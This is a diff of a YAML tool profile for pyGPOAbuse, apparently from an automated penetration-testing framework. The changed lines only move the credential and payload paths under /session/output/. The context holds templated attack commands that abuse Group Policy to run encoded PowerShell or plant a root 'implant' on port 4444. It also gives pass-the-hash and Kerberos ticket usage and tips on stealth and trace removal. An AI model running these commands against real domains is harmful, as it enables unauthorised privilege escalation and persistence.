@@ -206,7 +206,7 @@ usage_patterns:
     when: "When you have an NT hash via responder/secretsdump but no cleartext. Form: `-hashes :NTHASH` with leading colon for the empty LM half. The credential blob has NO password (no `:` after the user) — pyGPOAbuse pulls the hash from -hashes. Payload `net localgroup administrators` requires the GPO to apply to a Windows client (computer GPO, not user)."
 
   - name: "Kerberos pass-the-ticket GPO abuse"
-    command: "pygpoabuse '{domain}/{username}' -k -ccache /session/credentials/{user}.ccache -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command 'powershell.exe -enc {b64_payload}' -powershell"
+    command: "pygpoabuse '{domain}/{username}' -k -ccache /session/output/credentials/{user}.ccache -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command 'powershell.exe -enc {b64_payload}' -powershell"
     when: "When NTLM is disabled domain-wide or you only have a TGT. -k is BARE BOOLEAN; `-ccache /path/to/file.ccache` supplies the ticket cache (REQUIRED with -k — pyGPOAbuse argparse rejects -k without -ccache). The credential blob has neither password nor hash. -powershell wraps the command in `powershell.exe -enc` automatically."
 
   - name: "Custom task name and description (operational stealth)"
@@ -234,8 +234,8 @@ usage_patterns:
     when: "When the default output is too terse (e.g., 'Error while updating versions' with no detail). -v is INFO, -vv is DEBUG. Verbose mode dumps SMB/LDAP traffic and impacket exception traces — essential for diagnosing why a GPO write rejected (signing required, AdminSDHolder reset, etc.)."
 
   - name: "Linux Samba AD — upload an executable for boot-time execution"
-    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' --linux-exec /session/payloads/implant --linux-args '--port 4444' --linux-run-as root"
-    when: "Samba AD environments treat GPOs differently — pyGPOAbuse has dedicated --linux-exec / --linux-args / --linux-run-as flags that drop a binary into SYSVOL and add a login.sh hook. NOT for Windows AD. The local executable (--linux-exec value) must be readable inside the container; pin under /session/."
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' --linux-exec /session/output/payloads/implant --linux-args '--port 4444' --linux-run-as root"
+    when: "Samba AD environments treat GPOs differently — pyGPOAbuse has dedicated --linux-exec / --linux-args / --linux-run-as flags that drop a binary into SYSVOL and add a login.sh hook. NOT for Windows AD. The local executable (--linux-exec value) must be readable inside the container; pin under /session/output/."
 
 output_formats:
   # pyGPOAbuse has NO native JSON / XML output flag — it writes plain prose
@@ -289,8 +289,8 @@ gotchas:
   - "GROUP POLICY REFRESH TIMING — the injected task does NOT run instantly. Default refresh is 90-120 minutes (random offset). For an immediate fire, use impacket-atexec / impacket-psexec / netexec smb to run `gpupdate /force` on a target client AFTER the GPO write succeeds. Without the forced refresh, expect ~90 min wait."
   - "CLEANUP IS NOT ATOMIC — `--cleanup` removes the Immediate Scheduled Task XML from SYSVOL and rolls the GPO version back. BUT: if the task already fired on some clients during the gap between push and cleanup, the local Scheduled Tasks on those clients remain (Task Scheduler library entries). Cleanup those per-client via schtasks /delete or impacket-atexec for full-trace removal."
   - "PASS-THE-HASH FORMAT — `-hashes :NTHASH` with LEADING COLON for the empty LM half. Bare `NTHASH` without colon → pyGPOAbuse 'Wrong hash format. Expecting lm:nt' and exits 1. Full `LMHASH:NTHASH` also works."
-  - "KERBEROS REQUIRES -ccache — `-k` is a bare boolean, but pyGPOAbuse's argparse logic exits 1 if `-k` is set without `-ccache /path/to/file.ccache`. The KRB5CCNAME env var is NOT consulted (unlike bloodyAD's auto-discovery). Always pair: `-k -ccache /session/credentials/<user>.ccache`."
-  - "CCACHE PATH MUST BE READABLE — pyGPOAbuse passes the ccache path through impacket's URL builder. The path must be ABSOLUTE and the file must exist + be readable inside the container. Pin under /session/credentials/ for persistence across container restarts."
+  - "KERBEROS REQUIRES -ccache — `-k` is a bare boolean, but pyGPOAbuse's argparse logic exits 1 if `-k` is set without `-ccache /path/to/file.ccache`. The KRB5CCNAME env var is NOT consulted (unlike bloodyAD's auto-discovery). Always pair: `-k -ccache /session/output/credentials/<user>.ccache`."
+  - "CCACHE PATH MUST BE READABLE — pyGPOAbuse passes the ccache path through impacket's URL builder. The path must be ABSOLUTE and the file must exist + be readable inside the container. Pin under /session/output/credentials/ for persistence across container restarts."
   - "DOMAIN PART IS REQUIRED — if the credential blob has no `/` (e.g., bare `jdoe:hunter2`), pyGPOAbuse exits with `Domain should be specified!`. Always supply `domain/user...`."
   - "GPO-ID OR GPO-NAME IS MUTUALLY EXCLUSIVE BUT REQUIRED — pyGPOAbuse argparse uses an `add_mutually_exclusive_group(required=True)` for -gpo-id / -gpo-name. Missing both → `argparse: one of the arguments -gpo-id -gpo-name is required`. Both at once → `argparse: not allowed with argument`."
   - "NO STRUCTURED OUTPUT — pyGPOAbuse writes plain prose via Python logging with `[+]`/`[-]`/`[!]` prefixes. Success marker is `SUCCESS:root:ScheduledTask <name> created!` (custom log level 25). Errors are `[!] ...` or Python tracebacks. No --json / -o / --output flag exists."
@@ -346,7 +346,7 @@ failure_signatures:
   - signal: "KDC_ERR_PREAUTH_FAILED"
     remediation: "Kerberos pre-auth failed — wrong password / hash / AES key. With -k, the ccache is invalid or for a different user. Verify ccache validity with `klist -c <ccache>` or `impacket-getTGT` to refresh."
   - signal: "ccache required"
-    remediation: "-k was passed without -ccache. pyGPOAbuse requires the explicit ccache path (does NOT consult KRB5CCNAME env). Add `-ccache /session/credentials/<user>.ccache`."
+    remediation: "-k was passed without -ccache. pyGPOAbuse requires the explicit ccache path (does NOT consult KRB5CCNAME env). Add `-ccache /session/output/credentials/<user>.ccache`."
   - signal: "argument required"
     remediation: "argparse — missing required positional or flag. Common: missing the credential blob first positional, missing -gpo-id / -gpo-name, or missing -command (for scheduled task creation). Read the specific arg name in the error."
   - signal: "unrecognized arguments"
